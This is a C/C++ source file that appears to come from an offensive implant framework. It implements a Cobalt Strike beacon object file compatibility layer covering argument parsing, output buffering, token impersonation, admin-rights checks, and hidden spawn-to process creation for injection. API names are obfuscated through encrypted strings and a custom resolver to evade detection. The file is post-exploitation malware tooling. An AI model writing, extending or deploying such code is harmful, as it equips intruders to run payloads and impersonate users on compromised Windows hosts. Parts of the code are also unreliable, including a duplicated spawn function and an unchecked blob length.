/*
 * Cobalt Strike 4.X BOF compatibility layer
 * -----------------------------------------
 * The whole point of these files are to allow beacon object files built for CS
 * to run fine inside of other tools without recompiling.
 *
 * Built off of the beacon.h file provided to build for CS.
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdarg.h>
#ifdef _WIN32
#include <windows.h>

#include "../../include/coff/beacon_compatibility.h"
#include "../../include/utils.h"
#include "../../include/resolver.h"
#include "../../include/injection.h"
#include "../../libs/bastia/bastia.h"
#include "../../include/pandragon_runtime.h"

#ifdef _WIN64
    #define X86PATH "SysWOW64"
    #define X64PATH "System32"
#else
    #define X86PATH "System32"
    #define X64PATH "sysnative"
#endif

extern functionTable* g_functionTable;
static const BeaconConfig* g_beaconConfig = NULL;

void setBeaconConfig(const BeaconConfig* config) {
    g_beaconConfig = config;
}

/* Data Parsing */

/*
 * Stub exception handler for MSVC-compiled BOFs
 * COFF files compiled with /EHsc reference __C_specific_handler for unwind info
 * We forward directly to ntdll.dll's __C_specific_handler to handle SEH properly
 */

typedef EXCEPTION_DISPOSITION (__cdecl *p__C_specific_handler)(
    struct _EXCEPTION_RECORD* _ExceptionRecord,
    unsigned __int64 _MemoryStackFp,
    unsigned __int64 _BackingStoreFp,
    struct _CONTEXT* _ContextRecord,
    struct _DISPATCHER_CONTEXT* _DispatcherContext,
    unsigned __int64 _GlobalPointer
);

extern "C" EXCEPTION_DISPOSITION __cdecl __C_specific_handler_stub(
    struct _EXCEPTION_RECORD* ExceptionRecord,
    unsigned __int64 MemoryStackFp,
    unsigned __int64 BackingStoreFp,
    struct _CONTEXT* ContextRecord,
    struct _DISPATCHER_CONTEXT* DispatcherContext,
    unsigned __int64 GlobalPointer
) {
    HMODULE ntdll = GetModuleBaseAddressA(lcg_encrypt("ntdll.dll"));
    if (!ntdll) {
        return ExceptionContinueSearch;
    }

    p__C_specific_handler real_handler = (p__C_specific_handler)__GetProcAddress(ntdll, lcg_encrypt("__C_specific_handler"));
    if (!real_handler) {
        return ExceptionContinueSearch;
    }

    return real_handler(ExceptionRecord, MemoryStackFp, BackingStoreFp, ContextRecord, DispatcherContext, GlobalPointer);
}

// Function pointer type for beacon compatibility functions
typedef void* (*BeaconFuncPtr)();

// Use a macro to populate the table with encrypted names
#define INTERNAL_FUNC(name, ptr) { \
    lcg_encrypt_array(name), (void*)(ptr) \
}

static volatile LONG g_output_oplock = 0;

static inline void output_lock(void) {
    while (_InterlockedCompareExchange(&g_output_oplock, 1, 0) != 0) { }
}

static inline void output_unlock(void) {
    _InterlockedExchange(&g_output_oplock, 0);
}

InternalFunctionEntry InternalFunctions[32] = {
    INTERNAL_FUNC("BeaconDataParse",               BeaconDataParse),
    INTERNAL_FUNC("BeaconDataInt",                 BeaconDataInt),
    INTERNAL_FUNC("BeaconDataShort",             BeaconDataShort),
    INTERNAL_FUNC("BeaconDataLength",             BeaconDataLength),
    INTERNAL_FUNC("BeaconDataExtract",           BeaconDataExtract),
    INTERNAL_FUNC("BeaconFormatAlloc",            BeaconFormatAlloc),
    INTERNAL_FUNC("BeaconFormatReset",          BeaconFormatReset),
    INTERNAL_FUNC("BeaconFormatFree",         BeaconFormatFree),
    INTERNAL_FUNC("BeaconFormatAppend",      BeaconFormatAppend),
    INTERNAL_FUNC("BeaconFormatPrintf",      BeaconFormatPrintf),
    INTERNAL_FUNC("BeaconFormatToString",    BeaconFormatToString),
    INTERNAL_FUNC("BeaconFormatInt",        BeaconFormatInt),
    INTERNAL_FUNC("BeaconPrintf",           BeaconPrintf),
    INTERNAL_FUNC("BeaconOutput",           BeaconOutput),
    INTERNAL_FUNC("BeaconUseToken",         BeaconUseToken),
    INTERNAL_FUNC("BeaconRevertToken",       BeaconRevertToken),
    INTERNAL_FUNC("BeaconIsAdmin",           BeaconIsAdmin),
    INTERNAL_FUNC("BeaconGetSpawnTo",        BeaconGetSpawnTo),
    INTERNAL_FUNC("BeaconSpawnTemporaryProcess", BeaconSpawnTemporaryProcess),
    INTERNAL_FUNC("BeaconInjectProcess",     BeaconInjectProcess),
    INTERNAL_FUNC("BeaconInjectTemporaryProcess", BeaconInjectTemporaryProcess),
    INTERNAL_FUNC("BeaconCleanupProcess",    BeaconCleanupProcess),
    INTERNAL_FUNC("toWideChar",             toWideChar),
    INTERNAL_FUNC("LoadLibraryA",           __LoadLibraryA),
    INTERNAL_FUNC("GetProcAddress",          __GetProcAddress),
    INTERNAL_FUNC("GetModuleHandleA",         GetModuleBaseAddressA),
    INTERNAL_FUNC("FreeLibrary",             __FreeLibrary),
    INTERNAL_FUNC("__C_specific_handler",          __C_specific_handler_stub),
    INTERNAL_FUNC("BeaconGetPersistentStateData",        BeaconGetPersistentStateData),
    INTERNAL_FUNC("BeaconSetPersistentStateData",        BeaconSetPersistentStateData),
    INTERNAL_FUNC("BeaconIncreasePersistentStateData",   BeaconIncreasePersistentStateData),
    {NULL, NULL},
};


#if defined(__x86_64__) || defined(_M_X64) || defined(__i386__) || defined(_M_IX86)
// x86/x64 is always little-endian so use compiler builtin for optimal byte swap
static inline uint32_t swap_endianess(uint32_t indata) {
    return __builtin_bswap32(indata);
}
#else
// Fallback: runtime endianness detection for unknown platforms
uint32_t swap_endianess(uint32_t indata) {
    uint32_t outint = indata;
    const uint32_t testint = 0x01020304;
    if (((const unsigned char*)&testint)[0] == 0x04) {
        ((unsigned char*)&outint)[0] = ((const unsigned char*)&indata)[3];
        ((unsigned char*)&outint)[1] = ((const unsigned char*)&indata)[2];
        ((unsigned char*)&outint)[2] = ((const unsigned char*)&indata)[1];
        ((unsigned char*)&outint)[3] = ((const unsigned char*)&indata)[0];
    }
    return outint;
}
#endif

int beacon_compatibility_capacity = 0;
char* beacon_compatibility_output = NULL;
int beacon_compatibility_size = 0;
int beacon_compatibility_offset = 0;

void BeaconDataParse(datap* parser, char* buffer, int size) {
    if (parser == NULL || buffer == NULL) {
        return;
    }
    if (size < 4) {
        parser->length = 0;
        parser->size = 0;
        return;
    }
    parser->original = buffer;
    parser->buffer = buffer;
    parser->length = size - 4;
    parser->size = size - 4;
    parser->buffer += 4;
    return;
}

int BeaconDataInt(datap* parser) {
    if (parser == NULL) {
        return 0;
    }

    int32_t fourbyteint = 0;
    if (parser->length < 4) {
        return 0;
    }
    __memcpy(&fourbyteint, parser->buffer, 4);
    parser->buffer += 4;
    parser->length -= 4;
    return (int)fourbyteint;
}

short BeaconDataShort(datap* parser) {
    if (parser == NULL) {
        return 0;
    }

    int16_t retvalue = 0;
    if (parser->length < 2) {
        return 0;
    }
    __memcpy(&retvalue, parser->buffer, 2);
    parser->buffer += 2;
    parser->length -= 2;
    return (short)retvalue;
}

int BeaconDataLength(datap* parser) {
    if (parser == NULL) {
        return 0;
    }

    return parser->length;
}

char* BeaconDataExtract(datap* parser, int* size) {
    if (parser == NULL) {
        return NULL;
    }

    uint32_t length = 0;
    char* outdata = NULL;
    /*Length prefixed binary blob, going to assume uint32_t for this.*/
    if (parser->length < 4) {
        return NULL;
    }
    __memcpy(&length, parser->buffer, 4);
    parser->buffer += 4;

    outdata = parser->buffer;
    if (outdata == NULL) {
        return NULL;
    }
    parser->length -= 4;
    parser->length -= length;
    parser->buffer += length;
    if (size != NULL && outdata != NULL) {
        *size = length;
    }
    return outdata;
}

/* format API */

void BeaconFormatAlloc(formatp* format, int maxsz) {
    if (format == NULL) {
        return;
    }

    format->original = (char*)__calloc(maxsz, 1);
    format->buffer = format->original;
    format->length = 0;
    format->size = maxsz;
    return;
}

void BeaconFormatReset(formatp* format) {
    if (format == NULL) {
        return;
    }

    __memset(format->original, 0, format->size);
    format->buffer = format->original;
    format->length = 0;
    return;
}

void BeaconFormatFree(formatp* format) {
    if (format == NULL) {
        return;
    }
    if (format->original) {
        __free(format->original);
        format->original = NULL;
    }
    format->buffer = NULL;
    format->length = 0;
    format->size = 0;
    return;
}

void BeaconFormatAppend(formatp* format, char* text, int len) {
    if (!format || !text || format->length + len > format->size) return;
    __memcpy(format->buffer, text, len);
    format->buffer += len;
    format->length += len;
    return;
}

void BeaconFormatPrintf(formatp* format, char* fmt, ...) {
    if (!format || !fmt) return;
    size_t remaining = format->size - format->length;
    if (remaining <= 1) return;

    va_list args;
    va_start(args, fmt);
    int written = __vsnprintf(format->buffer, remaining, fmt, args);
    va_end(args);

    if (written > 0) {
        int actual = (written < (int)remaining - 1) ? written : (int)remaining - 1;
        format->length += actual;
        format->buffer += actual;
    }
}

char* BeaconFormatToString(formatp* format, int* size) {
    if (format == NULL || size == NULL) {
        return NULL;
    }

    *size = format->length;
    return format->original;
}

void BeaconFormatInt(formatp* format, int value) {
    if (format == NULL) {
        return;
    }

    uint32_t indata = value;
    uint32_t outdata = 0;
    if (format->length + 4 > format->size) {
        return;
    }
    outdata = swap_endianess(indata);
    __memcpy(format->buffer, &outdata, 4);
    format->length += 4;
    format->buffer += 4;
    return;
}

/* Main output functions */

/**
 * Ensure at least `needed` bytes of free space in the output buffer.
 * Grows capacity geometrically (1.5x) to avoid O(n²) realloc churn.
 * Returns true on success, false on OOM.
 */
static bool ensure_capacity(int required_total) {
    if (beacon_compatibility_capacity >= required_total) {
        return true;
    }

    // Grow: max(1.5x old capacity, required_total)
    int new_cap = beacon_compatibility_capacity;
    if (new_cap == 0) {
        new_cap = 1024;  /* start with 1KB */
    }
    while (new_cap < required_total) {
        new_cap = new_cap + (new_cap >> 1);  /* 1.5x growth */
    }

    char* newBuf = (char*)__malloc(new_cap);
    if (!newBuf) return false;

    if (beacon_compatibility_output) {
        __memcpy(newBuf, beacon_compatibility_output, beacon_compatibility_size);
        __free(beacon_compatibility_output);
    }
    beacon_compatibility_output = newBuf;
    beacon_compatibility_capacity = new_cap;
    return true;
}

void BeaconPrintf(int type, char* fmt, ...) {
    (void)type;  /* unused  */
    if (!fmt) return;

    output_lock();

    va_list args, args2;
    va_start(args, fmt);
    va_copy(args2, args);
    int needed = __vsnprintf(NULL, 0, fmt, args);
    va_end(args);

    if (needed <= 0) { va_end(args2); output_unlock(); return; }

    int required_total = beacon_compatibility_size + needed + 1;
    if (!ensure_capacity(required_total)) {
        va_end(args2);
        output_unlock();
        return;  /* OOM or max size exceeded */
    }

    int written = __vsnprintf(
        beacon_compatibility_output + beacon_compatibility_offset,
        needed + 1, fmt, args2);
    va_end(args2);

    if (written > 0) {
        beacon_compatibility_size   += written;
        beacon_compatibility_offset += written;
    }

    output_unlock();
}


void BeaconOutput(int type, char* data, int len) {
    if (!data || len <= 0) return;

    output_lock();

    int required_total = beacon_compatibility_size + len + 1;
    if (!ensure_capacity(required_total)) {
        output_unlock();
        return;  /* OOM or max size exceeded */
    }

    __memset(beacon_compatibility_output + beacon_compatibility_offset, 0, len + 1);

    // Copy new data
    __memcpy(
        beacon_compatibility_output + beacon_compatibility_offset,
        data,
        len
    );

    beacon_compatibility_size += len;
    beacon_compatibility_offset += len;

    output_unlock();
}

/* Token Functions */

bool BeaconUseToken(HANDLE token) {
    /* Probably needs to handle DuplicateTokenEx too.
    Works as of now because NULL = -2 = NtCurrentThread. */
    __SetThreadToken(NULL, token);
    return true;
}

void BeaconRevertToken(void) {
    if (!__RevertToSelf()) {
#ifdef DEBUG
        //printf("RevertToSelf Failed!\n");
#endif
    }
    return;
}

bool BeaconIsAdmin(void) {

    if (!g_functionTable->OpenProcessToken || !g_functionTable->GetTokenInformation) {
        return false;
    }

    HANDLE hToken = NULL;
    if (!g_functionTable->OpenProcessToken((HANDLE)-1, TOKEN_QUERY, &hToken)) {
        return false;
    }

    bool isAdmin = false;

    /*
     * Primary path: TokenElevation (Vista+, fast, no SID math)
     * Returns a TOKEN_ELEVATION struct with a single DWORD: TokenIsElevated.
     * If elevated, the token has admin privileges (or is the system account).
     */
    if (g_functionTable->GetTokenInformation) {
        struct { DWORD TokenIsElevated; } elevation;
        DWORD retLen = 0;
        if (g_functionTable->GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &retLen)) {
            if (retLen == sizeof(elevation)) {
                isAdmin = (elevation.TokenIsElevated != 0);
                g_functionTable->NtClose(hToken);
                return isAdmin;
            }
        }
    }

    /*
     * Fallback: TokenGroups -> iterate group SIDs and check for
     * S-1-5-32-544 (BUILTIN\Administrators).
     *
     * SID structure:
     *   Revision(1) SubAuthorityCount(1) IdentifierAuthority(6) SubAuthorities[N]
     * BUILTIN = S-1-5-32  -> SubAuth[0] = 32
     * ADMINS  = S-1-5-32-544 -> SubAuth[1] = 544 (DOMAIN_ALIAS_RID_ADMINS)
     */
    DWORD dwSize = 0;
    g_functionTable->GetTokenInformation(hToken, TokenGroups, NULL, 0, &dwSize);
    if (dwSize == 0) {
        g_functionTable->NtClose(hToken);
        return false;
    }

    TOKEN_GROUPS* pGroups = (TOKEN_GROUPS*)__malloc(dwSize);
    if (!pGroups) {
        g_functionTable->NtClose(hToken);
        return false;
    }

    if (!g_functionTable->GetTokenInformation(hToken, TokenGroups, pGroups, dwSize, &dwSize)) {
        __free(pGroups);
        g_functionTable->NtClose(hToken);
        return false;
    }

    g_functionTable->NtClose(hToken);

    for (DWORD i = 0; i < pGroups->GroupCount; i++) {
        SID_AND_ATTRIBUTES* sa = &pGroups->Groups[i];

        /* Skip disabled or deny-only groups, we want enabled/admin groups */
        if (!(sa->Attributes & SE_GROUP_ENABLED)) {
            continue;
        }

        PSID pSid = sa->Sid;
        if (!pSid) {
            continue;
        }

        /* Inline SID length check: we need at least 2 sub-authorities.
         * SID layout: Revision(1) + SubAuthorityCount(1) + IdentifierAuthority(6) + SubAuthorities[N*4]
         * Minimum size for 2 sub-auths: 8 + 2*4 = 16 bytes
         */
        BYTE* pSidBytes = (BYTE*)pSid;
        BYTE revision = pSidBytes[0];
        BYTE subAuthCount = pSidBytes[1];
        if (revision != 1 || subAuthCount < 2) {
            continue;
        }

        /* IdentifierAuthority is big-endian at offset 2-7.
         * SECURITY_NT_AUTHORITY = {0,0,0,0,0,5}
         */
        if (pSidBytes[2] != 0 || pSidBytes[3] != 0 || pSidBytes[4] != 0 ||
            pSidBytes[5] != 0 || pSidBytes[6] != 0 || pSidBytes[7] != 5) {
            continue;
        }

        /* SubAuthorities start at offset 8.
         * S-1-5-32-544 -> SubAuth[0]=32 (BUILTIN), SubAuth[1]=544 (ADMINS)
         */
        DWORD* pSubAuth = (DWORD*)(pSidBytes + 8);
        if (pSubAuth[0] == 32 && pSubAuth[1] == 544) {
            isAdmin = true;
            break;
        }
    }

    __free(pGroups);
    return isAdmin;
}


void BeaconGetSpawnTo(bool x86, char* buffer, int length) {
    const char* tempBufferPath = NULL;

    if (buffer == NULL || length <= 0) {
        return;
    }

    // Use config if available, otherwise fallback to defaults
    if (g_beaconConfig != NULL) {
        if (x86 && g_beaconConfig->spawnto_x86_len > 0) {
            tempBufferPath = g_beaconConfig->spawnto_x86;
        } else if (!x86 && g_beaconConfig->spawnto_x64_len > 0) {
            tempBufferPath = g_beaconConfig->spawnto_x64;
        }
    }

    // Fallback: cannot proceed without config (should never happen)
    if (tempBufferPath == NULL) {
        return;
    }

    SIZE_T pathLen = __strlen(tempBufferPath);
    // Ensure there's room for the string AND null terminator
    if (pathLen >= (SIZE_T)length) {
        return;
    }
    __memcpy(buffer, tempBufferPath, pathLen);
    buffer[pathLen] = '\0';
    return;
}

bool BeaconSpawnTemporaryProcess(bool x86, bool ignoreToken, STARTUPINFO * sInfo, PROCESS_INFORMATION * pInfo) {
    (void)ignoreToken;

    bool bSuccess = false;
    const char* spawntoPath = NULL;

    if (g_beaconConfig != NULL) {
        if (x86 && g_beaconConfig->spawnto_x86_len > 0) {
            spawntoPath = g_beaconConfig->spawnto_x86;
        } else if (!x86 && g_beaconConfig->spawnto_x64_len > 0) {
            spawntoPath = g_beaconConfig->spawnto_x64;
        }
    }

    bSuccess = g_functionTable->CreateProcessA(NULL, (char*)spawntoPath, NULL, NULL, true, CREATE_NO_WINDOW, NULL, NULL, sInfo, pInfo);
    return bSuccess;
}


void BeaconCleanupProcess(PROCESS_INFORMATION* pInfo) {
    if (pInfo != NULL) {
        (void)g_functionTable->NtClose(pInfo->hThread);
        (void)g_functionTable->NtClose(pInfo->hProcess);
    }
    return;
}

bool   toWideChar(char * src, wchar_t * dst, int max)
{
    if (!src || !dst || max < (int)sizeof(wchar_t)) {
        return FALSE;
    }

    // Convert ANSI -> wide
    size_t converted = __mbstowcs(dst, src, max / sizeof(wchar_t));
    if (converted == (size_t)-1) {
        // Conversion failed
        if (max > 0) dst[0] = L'\0';
        return FALSE;
    }

    // Ensure null-termination
    dst[(converted < (size_t)(max / sizeof(wchar_t))) ? converted : (max / sizeof(wchar_t) - 1)] = L'\0';
    return TRUE;
}

//  Persistent BOF State API 
#define MAX_PERSISTENT_STATES 16

struct PersistentStateEntry {
    uint64_t uuid;
    uint8_t* data;
    size_t   size;
    bool     in_use;
};

static PersistentStateEntry g_persistent_states[MAX_PERSISTENT_STATES];

static PersistentStateEntry* _find_persistent_state(uint64_t uuid) {
    for (int i = 0; i < MAX_PERSISTENT_STATES; i++) {
        if (g_persistent_states[i].in_use && g_persistent_states[i].uuid == uuid)
            return &g_persistent_states[i];
    }
    return NULL;
}

static PersistentStateEntry* _alloc_persistent_state(uint64_t uuid) {
    for (int i = 0; i < MAX_PERSISTENT_STATES; i++) {
        if (!g_persistent_states[i].in_use) {
            g_persistent_states[i].uuid   = uuid;
            g_persistent_states[i].data   = NULL;
            g_persistent_states[i].size   = 0;
            g_persistent_states[i].in_use = true;
            return &g_persistent_states[i];
        }
    }
    return NULL;
}

extern "C" void* BeaconGetPersistentStateData(uint64_t UUID, size_t* out_len) {
    auto* entry = _find_persistent_state(UUID);
    if (!entry || !entry->data) {
        if (out_len) *out_len = 0;
        return NULL;
    }
    if (out_len) *out_len = entry->size;
    return entry->data;
}

extern "C" bool BeaconSetPersistentStateData(uint64_t UUID, void* src, size_t len) {
    if (!src || len == 0) return false;

    auto* entry = _find_persistent_state(UUID);
    if (!entry) {
        entry = _alloc_persistent_state(UUID);
        if (!entry) return false;
    }

    uint8_t* new_buf = (uint8_t*)__malloc(len);
    if (!new_buf) return false;

    if (entry->data)
        __free(entry->data);

    __memcpy(new_buf, src, len);
    entry->data = new_buf;
    entry->size = len;
    return true;
}

extern "C" bool BeaconIncreasePersistentStateData(uint64_t UUID, size_t new_len) {
    auto* entry = _find_persistent_state(UUID);
    if (!entry || !entry->data) return false;
    if (new_len <= entry->size) return true;

    uint8_t* new_buf = (uint8_t*)__malloc(new_len);
    if (!new_buf) return false;

    __memcpy(new_buf, entry->data, entry->size);
    __memset(new_buf + entry->size, 0, new_len - entry->size);
    __free(entry->data);
    entry->data = new_buf;
    entry->size = new_len;
    return true;
}

char* BeaconGetOutputData(int *outsize) {
    if (outsize == NULL) {
        return NULL;
    }

    output_lock();

    char* outdata = beacon_compatibility_output;
    *outsize = beacon_compatibility_size;
    beacon_compatibility_output = NULL;
    beacon_compatibility_size = 0;
    beacon_compatibility_offset = 0;
    beacon_compatibility_capacity = 0;  /* buffer handed off; capacity is now gone */

    output_unlock();

    return outdata;
}

/* Spawn+Inject Functions - Stubs for CS BOF compatibility */

bool BeaconSpawnTemporaryProcess(bool x86, bool ignoreToken, STARTUPINFOW * sInfo, PROCESS_INFORMATION * pInfo) {
    if (!sInfo || !pInfo || !g_functionTable) return false;

    const char* spawntoPath = NULL;

    if (g_beaconConfig != NULL) {
        if (x86 && g_beaconConfig->spawnto_x86_len > 0) {
            spawntoPath = g_beaconConfig->spawnto_x86;
        } else if (!x86 && g_beaconConfig->spawnto_x64_len > 0) {
            spawntoPath = g_beaconConfig->spawnto_x64;
        }
    }

    if (spawntoPath == NULL) {
        return false;
    }

    wchar_t wcmd[MAX_PATH];
    if (__mbstowcs(wcmd, spawntoPath, MAX_PATH) == (size_t)-1) return false;

    __memset(sInfo, 0, sizeof(STARTUPINFOW));
    sInfo->cb = sizeof(STARTUPINFOW);
    sInfo->dwFlags = STARTF_USESTDHANDLES;

    HANDLE hToken = NULL;
    if (!ignoreToken) {
        if (g_functionTable->OpenProcessToken) {
            g_functionTable->OpenProcessToken((HANDLE)-1, TOKEN_ALL_ACCESS, &hToken);
        }
    }

    bool success = false;
    if (g_functionTable->CreateProcessW) {
        success = g_functionTable->CreateProcessW(wcmd, NULL, NULL, NULL, ignoreToken ? false : true,
                                  CREATE_NO_WINDOW, NULL, NULL, sInfo, pInfo);
    }

    if (hToken && g_functionTable->NtClose) {
        g_functionTable->NtClose(hToken);
    }
    return success;
}

#endif
